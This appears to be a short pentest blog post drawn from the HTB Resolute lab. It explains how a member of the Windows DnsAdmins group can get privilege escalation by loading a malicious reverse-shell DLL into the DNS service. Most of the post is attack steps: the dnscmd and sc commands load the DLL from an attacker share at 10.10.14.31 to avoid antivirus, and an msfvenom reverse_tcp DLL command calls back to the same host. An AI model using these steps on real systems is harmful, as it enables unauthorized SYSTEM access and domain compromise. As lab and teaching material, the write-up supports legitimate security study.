---
layout: post
title: Malicious DLL Injection
description: Malicious DLL Injection
summary: Malicious DLL Injection
tags: [dns,privesc,windows]
minute: 1
---
## Overview
If low privileged user is a member of `DnsAdmins`, attacker can inject a malicuous DLL in DNS service and achieve privilege escalation.

## Environment Setup and Requirements
* Low privileged user must be a member of `DnsAdmins`
* Low privileged user must be able to start and stop DNS service
* Separate attacker windows machine for compiling DLL

## Steps
* Download this [DLL DNS plugin](https://github.com/dim0x69/dns-exe-persistance) and open it in attacker windows machine
* Get this [reverse shell](https://github.com/tudorthe1ntruder/reverse-shell-poc/blob/master/rs.c), update it with your IP/PORT settings, and put it under sources. Ensure to add `#include "stdafx.h"` at the top.

![](/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/95AB122B-C8B0-41F0-952F-B4399E09CA94.png)

* Create this header file

![](/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/7E830899-6043-4556-8937-60E2BAA92DC1.png)

* Update the main code. These changes below will create a new thread which help prevent crashing the DNS service.

![](/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/FD577ECA-AAFC-4644-A205-6CEEB0CD09EA.png)

* Change to "Release" and start building

![](/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/F49524CA-53B0-402B-8A2D-3BC0AFEE46B4.png)

* DLL should be generated similar to this path. Transfer it to victim machine.

![](/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/B5913B2A-E0A5-439D-ACCC-8BEFCAA2D9FE.png)

* Open netcat listener on attacker
* Inside victim, load the DLL into DNS service and restart DNS to activate it. In this step, we are loading the DLL from attacker share to bypass some AV.

```powershell
# load
dnscmd /config /serverlevelplugindll \\10.10.14.31\share\Win32Project1.dll

# verify
dnscmd /config /serverlevelplugindll \\10.10.14.31\share\Win32Project1.dll

# stop dns
cmd /c sc stop dns

# start dns
cmd /c sc start dns
```

## Troubleshooting
* For some reason, DLL generated by msfvenom doesn't work. Seems its crashing the DNS service.

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.31 LPORT=4444 -f dll > evil.dll
```

* If you encounter MFC errors during build, install the MFC libraries from Visual Studio Installer

![](/spindel/assets/DNSAdmin%20Malicious%20DLL%20Injection/91D4854E-486D-411A-9732-E40C0FAACD16.png)

* If you encounter `revshell: must return a value`, add a return value at the end of `rev.cpp`

```cpp
// [..redacted...]
	WSACleanup();
	return 0;
}
```

## References
* HTB Resolute
* [Escalating Privileges with DNSAdmins Group](https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b)
* [From DnsAdmins to SYSTEM to Domain Compromise](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise#abuse-dns-with-dnscmd)
